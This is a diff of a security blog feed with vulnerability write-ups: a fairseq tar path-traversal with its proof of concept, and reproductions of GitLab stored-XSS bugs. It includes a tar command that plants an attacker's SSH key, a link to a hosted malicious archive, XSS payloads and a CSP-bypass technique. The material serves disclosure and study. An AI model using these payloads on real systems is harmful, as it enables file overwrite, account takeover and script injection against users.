+
+    # Extract archive to temp dir and replace .tar.bz2 if necessary
+    tempdir = None
+    if not os.path.isdir(resolved_archive_file):
+        tempdir = tempfile.mkdtemp()
+        logger.info(
+            "extracting archive file {} to temp dir {}".format(
+                resolved_archive_file, tempdir
+            )
+        )
+        ext = os.path.splitext(archive_file)[1][1:]
+        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
+            top_dir = os.path.commonprefix(archive.getnames())
+            archive.extractall(tempdir)
+        os.remove(resolved_archive_file)
+        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
+        shutil.rmtree(tempdir)
+
+    return resolved_archive_file
+</code></pre></div></div>
+
+<p>and then in <code class="language-plaintext highlighter-rouge">file_utils.cached_path</code>, when parmeter <code class="language-plaintext highlighter-rouge">url_or_filename</code> is an url, it calls <a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L279">file_utils.get_from_cache</a> to download tar file and save file content in temperary file and return the temperary file path to <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_from_cache(url, cache_dir=None):
+    ...    
+    cache_path = os.path.join(cache_dir, filename)
+    if not os.path.exists(cache_path):
+        # Download to temporary file, then copy to cache dir once finished.
+        # Otherwise you get corrupt cache entries if the download gets interrupted.
+        with tempfile.NamedTemporaryFile() as temp_file:
+            logger.info("%s not found in cache, downloading to %s", url, temp_file.name)
+
+            # GET file object
+            if url.startswith("s3://"):
+                s3_get(url, temp_file)
+            else:
+                ##### Download tar file from url!!!!! #####
+                http_get(url, temp_file)
+
+            # we are copying the file before closing it, so flush to avoid truncation
+            temp_file.flush()
+            # shutil.copyfileobj() starts at the current position, so go to the start
+            temp_file.seek(0)
+    ...
+    return cache_path
+</code></pre></div></div>
+
+<p>Back to <code class="language-plaintext highlighter-rouge">file_utils.load_archive_file</code>, the malicious tar file is opened by <code class="language-plaintext highlighter-rouge">tarfile.open</code> and extracted by <code class="language-plaintext highlighter-rouge">archive.extractall</code> without any security checks which is well-known vulnerability. when tar file is compressed by <code class="language-plaintext highlighter-rouge">tar</code> option <code class="language-plaintext highlighter-rouge">--absolute-names</code>, absolute path names and relative path names can be included in tar file. When extracted by <code class="language-plaintext highlighter-rouge">tarfile.extractall</code>, the file with absolute names will overwrite target files silently, causing arbitrary file overwite.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_archive_file(archive_file):
+    ...
+    # Extract archive to temp dir and replace .tar.bz2 if necessary
+    tempdir = None
+    if not os.path.isdir(resolved_archive_file):
+        tempdir = tempfile.mkdtemp()
+        logger.info(
+            "extracting archive file {} to temp dir {}".format(
+                resolved_archive_file, tempdir
+            )
+        )
+        ext = os.path.splitext(archive_file)[1][1:]
+        with tarfile.open(resolved_archive_file, "r:" + ext) as archive:
+            top_dir = os.path.commonprefix(archive.getnames())
+            archive.extractall(tempdir)
+        os.remove(resolved_archive_file)
+        shutil.move(os.path.join(tempdir, top_dir), resolved_archive_file)
+        shutil.rmtree(tempdir)
+
+    return resolved_archive_file
+</code></pre></div></div>
+
+<p>During the testing, I found the file to be overwrite is missing. By reading the source code carefully, it uses <code class="language-plaintext highlighter-rouge">shutil.move</code> to move files extracted to <code class="language-plaintext highlighter-rouge">resolved_archive_file</code> target. The move source is from <code class="language-plaintext highlighter-rouge">os.path.join(tempdir, top_dir)</code> and <code class="language-plaintext highlighter-rouge">top_dir</code> is from <code class="language-plaintext highlighter-rouge">os.path.commonprefix(archive.getnames())</code>. Well, this is controlled by attacker, in <a href="https://docs.python.org/3/library/os.path.html#os.path.commonprefix">Python documents</a>, when list contains both abs and relative pathnames, it will return empty string in which attacker can include abs and relative names in tar file, and then <code class="language-plaintext highlighter-rouge">move</code> source will be <code class="language-plaintext highlighter-rouge">tempdir</code> which bypass the <code class="language-plaintext highlighter-rouge">shutil.move</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; os.path.commonprefix(['/home/kali/.ssh/xx', '404.html'])
+  ''
+&gt; os.path.join("/root/tmp/","")
+  '/root/tmp/'
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>An attacker can create a malicous tar file using following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys 404.html
+</code></pre></div></div>
+
+<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>
+
+<p>I have uploaded one malicous tar file for testing: <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar">https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar</a></p>
+
+<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">from_pretrained</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from fairseq.models.transformer import TransformerModel
+model = TransformerModel.from_pretrained('https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack-abs-and-relative.tar')
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; cat /home/kali/.ssh/authorized_keys
+ssh-rsa xxx hacker@test.com
+</code></pre></div></div>
+
+<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing">https://colab.research.google.com/drive/1AY9iqw_FdTvMGoqaDseX8jCnSGV9qCq6?usp=sharing</a></p>
+
+<p><img src="https://live.staticflickr.com/65535/53639482085_b57cae8712_k.jpg" alt="poc" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90">https://github.com/facebookresearch/fairseq/blob/bedb259bf34a9fc22073c13a1cee23192fa70ef3/fairseq/file_utils.py#L90</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞</title><link href="http://localhost:4000/xss/2024/03/17/xss-drawio.html" rel="alternate" type="text/html" title="中危：有道云笔记网页端渲染流程图存在存储型XSS漏洞" /><published>2024-03-17T10:26:18+08:00</published><updated>2024-03-17T10:26:18+08:00</updated><id>http://localhost:4000/xss/2024/03/17/xss-drawio</id><content type="html" xml:base="http://localhost:4000/xss/2024/03/17/xss-drawio.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>有道云笔记网页端渲染流程图存在存储型XSS漏洞</p>
@@ -189,7 +887,7 @@
 
 <ol>
   <li>对类图的node名称进行xss过滤</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline</title><link href="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html" rel="alternate" type="text/html" title="Replication: Gitlab Arbitrary file read via the bulk imports UploadsPipeline" /><published>2024-01-15T10:31:06+08:00</published><updated>2024-01-15T10:31:06+08:00</updated><id>http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports</id><content type="html" xml:base="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html"><![CDATA[<h2 id="name">Name</h2>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Reproduction: Gitlab Arbitrary file read via the bulk imports UploadsPipeline</title><link href="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html" rel="alternate" type="text/html" title="Reproduction: Gitlab Arbitrary file read via the bulk imports UploadsPipeline" /><published>2024-01-15T10:31:06+08:00</published><updated>2024-01-15T10:31:06+08:00</updated><id>http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports</id><content type="html" xml:base="http://localhost:4000/path-traversal/2024/01/15/arbitrary-file-read-via-bulk-imports.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Gitlab Arbitrary file read via the bulk imports UploadsPipeline</p>
@@ -435,7 +1133,7 @@ end
 
 </code></pre></div>    </div>
   </li>
-</ol>]]></content><author><name></name></author><category term="path-traversal" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab Arbitrary file read via the UploadsRewriter when moving and issue</title><link href="http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter.html" rel="alternate" type="text/html" title="Replication: Gitlab Arbitrary file read via the UploadsRewriter when moving and issue" /><published>2024-01-10T10:31:06+08:00</published><updated>2024-01-10T10:31:06+08:00</updated><id>http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter</id><content type="html" xml:base="http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter.html"><![CDATA[<h2 id="name">Name</h2>
+</ol>]]></content><author><name></name></author><category term="path-traversal" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Reproduction: Gitlab Arbitrary file read via the UploadsRewriter when moving and issue</title><link href="http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter.html" rel="alternate" type="text/html" title="Reproduction: Gitlab Arbitrary file read via the UploadsRewriter when moving and issue" /><published>2024-01-10T10:31:06+08:00</published><updated>2024-01-10T10:31:06+08:00</updated><id>http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter</id><content type="html" xml:base="http://localhost:4000/path-traversal/2024/01/10/arbitrary-file-read-via-the-uploadsRewriter.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Gitlab Arbitrary file read via the UploadsRewriter when moving and issue</p>
@@ -753,7 +1451,7 @@ flowchart
 </code></pre></div>    </div>
     <p>程序运行到断点会在当前终端停下</p>
   </li>
-</ol>]]></content><author><name></name></author><category term="debug" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages</title><link href="http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki.html" rel="alternate" type="text/html" title="Replication: Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages" /><published>2023-12-25T10:31:06+08:00</published><updated>2023-12-25T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki</id><content type="html" xml:base="http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki.html"><![CDATA[<h2 id="name">Name</h2>
+</ol>]]></content><author><name></name></author><category term="debug" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Reproduction: Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages</title><link href="http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki.html" rel="alternate" type="text/html" title="Reproduction: Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages" /><published>2023-12-25T10:31:06+08:00</published><updated>2023-12-25T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki</id><content type="html" xml:base="http://localhost:4000/xss/2023/12/25/store-xss-in-rdocwiki.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Gitlab Cross-site Scripting (XSS) - Stored in RDoc wiki pages</p>
@@ -897,1122 +1595,4 @@ jquery-ujs 提供了一些额外的特性，如将 data-remote 属性应用到�
 }[#]
 </code></pre></div></div>
 
-<p>从下一个复现漏洞中得知利用前端 jquery 片段的漏洞，由于该漏洞需要在页面初始化时才会调用，而本次复现，后端渲染的漏洞代码直接通过路由页面返回。因此 main.js 得以执行触发该漏洞。</p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab Stored XSS in markdown when redacting references</title><link href="http://localhost:4000/xss/2023/12/05/store-xss-in-markdown.html" rel="alternate" type="text/html" title="Replication: Gitlab Stored XSS in markdown when redacting references" /><published>2023-12-05T10:31:06+08:00</published><updated>2023-12-05T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/12/05/store-xss-in-markdown</id><content type="html" xml:base="http://localhost:4000/xss/2023/12/05/store-xss-in-markdown.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Gitlab Stored XSS in markdown when redacting references</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>高危</p>
-</blockquote>
-
-<h2 id="environment">Environment</h2>
-
-<blockquote>
-  <p>Gdk version:
-1b0e37a87f64ea5aad3ec9af1de9d563ca2a6a44
-Gitlab version
-v12.9.2-ee
-Ubuntu version
-18.04</p>
-</blockquote>
-
-<blockquote>
-  <p>原文：<a href="https://hackerone.com/reports/836649">https://hackerone.com/reports/836649</a></p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-
-<h2 id="summary">Summary</h2>
-
-<p>漏洞函数<code class="language-plaintext highlighter-rouge">redacted_node_content</code>负责渲染 markdown 的 reference 部分，其中 node 的<code class="language-plaintext highlighter-rouge">data-original</code>属性能够被注入 xss，导致<code class="language-plaintext highlighter-rouge">#{content}</code>包含该 xss 返回前端得到执行。
-<em>lib/banzai/reference_redactor.rb:75</em></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def redacted_node_content(node)
-      original_content = node.attr('data-original')
-      link_reference = node.attr('data-link-reference')
-      # Build the raw &lt;a&gt; tag just with a link as href and content if
-      # it's originally a link pattern. We shouldn't return a plain text href.
-      original_link =
-        if link_reference == 'true'
-          href = node.attr('href')
-          content = original_content
-          %(&lt;a href="#{href}"&gt;#{content}&lt;/a&gt;)
-        end
-</code></pre></div></div>
-
-<h2 id="code-review">Code Review</h2>
-
-<h3 id="pre-byebug">pre-byebug</h3>
-
-<p>由于 ruby 版本比较老旧，无法使用 vscode 插件进行调试，选择 pre-byebug 手动调试。首先在代码行前插入 pre-byebug 断点 binding.pry，然后使用<code class="language-plaintext highlighter-rouge">bin/rails server</code>跑起来，遇到断点则自动停下。
-尝试关闭 log 开启调试，<code class="language-plaintext highlighter-rouge">rails server --help</code>知道，加上后缀可以关闭 log
-<code class="language-plaintext highlighter-rouge">bin/rails server --no-log-to-stdout</code>
-另外还有 puma 的日志需要关闭：
-<em>lib/gitlab/cluster/puma_worker_killer_initializer.rb:33</em> 添加：（见<a href="https://github.com/zombocom/puma_worker_killer">https://github.com/zombocom/puma_worker_killer</a>）
-<code class="language-plaintext highlighter-rouge">config.reaper_status_logs = false</code></p>
-
-<ol>
-  <li>通过 drawio 画出<a href="https://drive.google.com/file/d/1RuaQELwDr-kQDS1XHNpDNi8Xh7EQ4WZI/view?usp=sharing">函数流关系图</a>。找到部分触发该漏洞函数的 controller。</li>
-</ol>
-
-<h3 id="review">Review</h3>
-
-<ol>
-  <li>直接通过 markdown preview 渲染来实时获取渲染片段。经过调试发现，用户的输入首先会进行 html 化，然后进行渲染。
-<em>app/controllers/concerns/preview_markdown.rb</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>render json: {
-      body: view_context.markdown(result[:text], markdown_context_params),
-      references: {
-        users: result[:users],
-        suggestions: SuggestionSerializer.new.represent_diff(result[:suggestions]),
-        commands: view_context.markdown(result[:commands])
-      }
-    }
-</code></pre></div>    </div>
-    <p><em>app/helpers/markup_helper.rb:99</em></p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def markdown(text, context = {})
-    return '' unless text.present?
-    context[:project] ||= @project
-    context[:group] ||= @group
-    html = markdown_unsafe(text, context)
-    # byebug
-    prepare_for_rendering(html, context)
-  end
-</code></pre></div>    </div>
-    <p>从 preview 的调用栈，可以看到首先将 markdown 转为 html，然后再对 html 进行处理。<code class="language-plaintext highlighter-rouge">markdown_unsafe</code>主要负责前中期 html 转换，<code class="language-plaintext highlighter-rouge">prepare_for_rendering</code>负责 html 的后期处理，当然问题出在这个后期处理上。</p>
-  </li>
-  <li>通过函数名推断，输入 reference 相关 markdown，可以触发漏洞函数，查询文档可以得知 reference 的 markdown 语法。<a href="https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references">https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references</a>。（ps:分析项目还是要结合文档进行分析，不然什么时候才时候头呢？）</li>
-  <li>例如输入<code class="language-plaintext highlighter-rouge">@root</code>，这是一个用户引用 markdown，会引用 root 这个用户，那么第一个函数<code class="language-plaintext highlighter-rouge">markdown_unsafe</code>会返回 html:
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;p data-sourcepos="1:1-1:5" dir="auto"&gt;
-&lt;a href="/root" data-user="1" data-reference-type="user" data-container="body" data-placement="top" data-html="true" class="gfm gfm-project_member" title="Administrator"&gt;
-@root&lt;/a&gt;
-&lt;/p&gt;
-</code></pre></div>    </div>
-    <p>但是从漏洞函数分析，html 需要包含属性<code class="language-plaintext highlighter-rouge">data-origin</code>和<code class="language-plaintext highlighter-rouge">data-reference-link</code>这个两个值才行，特别是<code class="language-plaintext highlighter-rouge">data-reference-link</code>是必须的。</p>
-  </li>
-  <li>从文字着手分析，应该是包含链接的 reference，从文档查看，应该是：<code class="language-plaintext highlighter-rouge">[README](doc/README.md#L13)</code></li>
-  <li>经过代码审计，发现 gitlab 特定的 markdown 有两种输入方式，分别是 markdown 和 html 格式，html 由 markdown 渲染而来，因此用户输入该 html 也能达到同等渲染效果，但是 html 的输入扩大了攻击面。
-<em>gitlab-v12.9.2-ee/lib/banzai/pipeline/gfm_pipeline.rb</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># These filters transform GitLab Flavored Markdown (GFM) to HTML.
-# The nodes and marks referenced in app/assets/javascripts/behaviors/markdown/editor_extensions.js
-# consequently transform that same HTML to GFM to be copied to the clipboard.
-# Every filter that generates HTML from GFM should have a node or mark in
-# app/assets/javascripts/behaviors/markdown/editor_extensions.js.
-# The GFM-to-HTML-to-GFM cycle is tested in spec/features/copy_as_gfm_spec.rb.
-</code></pre></div>    </div>
-    <p>因此直接对 markdown 渲染后的元素进行拷贝作为基准 payload，下面拷贝了引用 issue 的 markdown<code class="language-plaintext highlighter-rouge">#1</code>所渲染的 html:</p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a href="http://127.0.0.1:3000/xss/xxss/-/issues/1" data-original="#1" data-link="false" data-link-reference="false" data-project="20" data-issue="436" data-reference-type="issue" data-container="body" data-placement="top" data-html="true" title="xss"&gt;#1&amp;lt;img src=x&amp;gt;&lt;/a&gt;
-</code></pre></div>    </div>
-    <p>payload 中<code class="language-plaintext highlighter-rouge">#1&amp;lt;img src=x&amp;gt;</code>是主要部分。该部分原本是 escape 后的字符串，但是在后端处理时将其赋值给了属性值，而 Nokogiri 库自动对属性值进行 unescape。</p>
-  </li>
-  <li>ruby 库 Nokogiri 解析 html 字符串时，会把属性中 html encoded 字符进行 unencoded，最终造成注入问题。
-<em>lib/banzai/filter/reference_filter.rb:132</em> 该函数将 html 字符串替换到 node 对象中，其中 html 字符串包含 escape 的属性值。
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def replace_link_node_with_href(node, link)
-    html = yield
-    binding.pry
-    node.replace(html) unless html == link
-end
-</code></pre></div>    </div>
-    <p>node.replace 是 nokogiri 库调用，该函数对 html 字符串进行解析，构建 html node 对象:
-<em>/home/kali/.rvm/gems/ruby-2.6.5/gems/nokogiri-1.10.8/lib/nokogiri/xml/node.rb:477</em></p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node_set = in_context(contents, options.to_i)
-</code></pre></div>    </div>
-    <p>其中解析字符串的函数由 nokogiri 的<a href="https://github.com/sparklemotion/nokogiri/blob/9aebcc669a7028e4faad1fc8b53cf46a2f2320ba/ext/nokogiri/xml_node.c#L2152">c 函数</a>实现。该函数负责解析属性和值，并且将属性值的 html 编码进行 unescape。</p>
-  </li>
-</ol>
-
-<h3 id="step-to-reproduce">Step to reproduce</h3>
-
-<ol>
-  <li>首先新建一个非公开的 issue，然后再新建一个公开 issue</li>
-  <li>在公开的 issue 中引用非公开的 issue 进行评论，并且注入 payload</li>
-</ol>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>其中2是私密issue，该payload需要发送在issue1中
-&lt;a href="http://127.0.0.1:3000/xss/xxss/-/issues/2" data-original="#2" data-link="false" data-link-reference="false" data-project="20" data-issue="437" data-reference-type="issue" data-container="body" data-placement="top" data-html="true" title="hacked"&gt;#2&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/a&gt;
-</code></pre></div></div>
-
-<ol>
-  <li>用其他账户登录，查看公开 issue，即可完成攻击</li>
-  <li>现在能够注入任意 html 和 xss payload，但是如果有 csp，那么需要绕过，绕过方法可以考虑 jquery：构造一个需要全局初始化的 html 片段，然后由前端进行注入。</li>
-</ol>
-
-<h3 id="csp-bypass">csp bypass</h3>
-
-<ol>
-  <li>当然这些绕过是平时找到的 gadget，需要每天日积月累的审计源代码才能找到。也就是说每天都要 debug，每天都要静态分析，每天都要动态分析才行。这需要理解软件的逻辑，什么是软件的逻辑，包括路由，渲染，功能之类的，这绝对不是做个漏洞复现，切片就足够的。</li>
-  <li>首先选定用 jquery 注入 script 标签的方式，通过 <code class="language-plaintext highlighter-rouge">\$\([</code>’”][\s\S]{0,100}?&lt;[\s\S]{3,200}?&gt;[\s\S]{0,100}?[<code class="language-plaintext highlighter-rouge">'"]\)</code> 来定位到。
-<em>app/assets/javascripts/gl_field_error.js</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>this.fieldErrorElement = $(`&lt;p class='${errorMessageClass} hidden'&gt;${this.errorMessage}&lt;/p&gt;`);
-</code></pre></div>    </div>
-  </li>
-  <li>逆向分析得知，该函数由 main.js 调用，也就是所谓的全局初始化代码
-<em>app/assets/javascripts/gl_field_errors.js</em>
-<em>app/assets/javascripts/main.js:337</em>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$('.gl-show-field-errors ').each((i, form) =&gt; new GlFieldErrors(form));
-</code></pre></div>    </div>
-  </li>
-  <li>该段代码显示，只要注入 class 为 gl-show-field-errors 的片段，就能够被执行，那么构造 payload 如下：
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;input class="gl-show-field-errors gl-field-error-ignore" type=url title="&lt;script&gt;alert(11)&lt;/script&gt;"/&gt;
-html encode:
-&amp;lt;input class=&amp;quot;gl-show-field-errors gl-field-error-ignore&amp;quot; type=url title=&amp;quot;&amp;lt;script&amp;gt;alert(11)&amp;lt;/script&amp;gt;&amp;quot;/&amp;gt;
-</code></pre></div>    </div>
-    <p><img src="/assets/gitlab/1/referencexss.png" alt="referencexss" /></p>
-  </li>
-  <li>虽然成功注入了，但是没有触发，原因是注入的 html 代码是动态渲染的，而初始化前端在动态渲染之前就已执行完毕。</li>
-  <li>看了作者的绕过方法，提供了两种绕过方法，其中一种是直接注入 script src 标签，并且 src 指向本域名的 js 文件。</li>
-  <li>csp 绕过，通过上传 js 到同域名下，再用 script 标签直接引用该 js，gitlab 提供 git lfs 服务端和客户端来管理用户上传的文件，如果用该客户端上传文件，那么点击该文件的链接就会直接下载，并且域名相同。github 也提供该功能，但是文件被保存到另一个域名中了，但是 gitlab 却依然是同域名。</li>
-  <li>以下为 lfs 的操作命令：
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://gitlab.com/sunriseXu/lfs.git
-git lfs track "*.js"
-vim test.js
-git add . &amp;&amp; git commit -m 'test'
-git push
-git lfs ls-files
-</code></pre></div>    </div>
-  </li>
-  <li>经过测试，发现 github 的查看和下载文件的链接都在 gitlab.com 域名中，但是即使不用 lfs 上传 js，其他文件的下载链接都是在 gitlab.com 域名中，所以 lfs 没有必要吧，经过测试还是有必要，报错如下：
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Refused to execute script from 'https://gitlab.com/1159309551xcz/lfs/-/raw/main/test?ref_type=heads&amp;inline=false' because its MIME type ('application/octet-stream') is not executable, and strict MIME type checking is enabled.
-</code></pre></div>    </div>
-    <p>就是说 script 的链接需要返回的 type 不能是 octet-stream
-上传一个 lfs 的 js 文件，返回的类型是 text/javascript：</p>
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://gitlab.com/1159309551xcz/lfs/-/raw/main/test.js?ref_type=heads&amp;inline=false
-</code></pre></div>    </div>
-    <p>但是上传非 lfs 的 js 文件，返回的类型是 text/octet-stream 和 text/plain，这两种都无法执行，果然还是要 lfs 上传才行，这是 gitlab 一个潜在漏洞。</p>
-  </li>
-</ol>
-
-<h2 id="tips">Tips</h2>
-
-<ol>
-  <li>从结论上说，该漏洞是底层库漏洞，nokogiri 从字符串创建 html 节点的过程存在漏洞，包括 nokogiri 的多个函数。该过程自动将属性中 html 编码进行反编码。而后续代码如果引用该编码码后的属性值插值到 html 字符串片段中，将引发 xss 注入。</li>
-  <li>漏洞定位应聚焦于 nokogiri 解析 html 字符串的相关函数。例如 replace，parse，new 等函数，太多了，可以说 nokogiri 这种解析机制就是很大的问题。当然即使 unescape 属性值，也需要后续插值才能构建完整攻击流程。因此对于该漏洞点位进行定位太泛泛了。</li>
-  <li>但是也有一些危险操作，例如将 node 的 text 也就是文本内容(通过 inner_html)方法获取，如果是 text，则自动 escape，如果是 node，则返回未编码的 html 字符串。危险的是将这些 inner_html 赋值给属性后转为 html 字符串，再次构建新 node 后，属性值就自动解码了，如果再次利用该属性值将带来危险。所以完成该攻击需要几个函数配合，那就是 nokogiri 的：
-    <ul>
-      <li>inner_html 函数：获取用户输入</li>
-      <li>赋值操作：例如<code class="language-plaintext highlighter-rouge">%Q(data-#{key.to_s.dasherize}="#{escape_once(value)}")</code>，将内容赋值给属性
-replace 等构建</li>
-      <li>node 函数：<code class="language-plaintext highlighter-rouge">node.replace(str)</code>等函数</li>
-      <li>获取属性值的函数 attr：<code class="language-plaintext highlighter-rouge">node.attr(xxx)</code>等函数</li>
-    </ul>
-  </li>
-  <li>引申到 jquery 中：<code class="language-plaintext highlighter-rouge">attr</code>方法将 escape 后的字符串自动 unescape</li>
-</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab Stored XSS via Kroki diagram</title><link href="http://localhost:4000/xss/2023/11/25/csp-bypass-xss-krokixss.html" rel="alternate" type="text/html" title="Replication: Gitlab Stored XSS via Kroki diagram" /><published>2023-11-25T10:31:06+08:00</published><updated>2023-11-25T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/11/25/csp-bypass-xss-krokixss</id><content type="html" xml:base="http://localhost:4000/xss/2023/11/25/csp-bypass-xss-krokixss.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Stored XSS via Kroki diagram</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>XSS</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>高危</p>
-</blockquote>
-
-<h2 id="environment">Environment</h2>
-
-<blockquote>
-  <p>gitlab 版本：v15.4.2-ee</p>
-</blockquote>
-
-<blockquote>
-  <p>原文：<a href="https://hackerone.com/reports/1731349">https://hackerone.com/reports/1731349</a></p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-
-<h2 id="summary">Summary</h2>
-
-<p>gitlab markdown 编辑器接受 html、md 和其他语言的输入和相互转换，并对其进行相应的渲染。本漏洞接受的是 kroki 图表的 html 输入，但是处理该输入时，没有对 html 标签的属性进行适当过滤，从而嵌入渲染后的 html 中，造成 html 属性注入。结合前端属性选择器漏洞，可以绕过 csp 注入 xss。
-<em>lib/banzai/filter/kroki_filter.rb</em></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>img_tag = Nokogiri::HTML::DocumentFragment.parse(%(&lt;img src="#{image_src}" /&gt;))
-</code></pre></div></div>
-
-<p>这里对用户字符串的处理用了 ruby 的<code class="language-plaintext highlighter-rouge">%()</code>语法，等同于<code class="language-plaintext highlighter-rouge">%Q()</code>，改语法相当于构造字符串，但是相较于双引号包裹”“，<code class="language-plaintext highlighter-rouge">%()</code>不用对内部的引号进行转义，很方便。
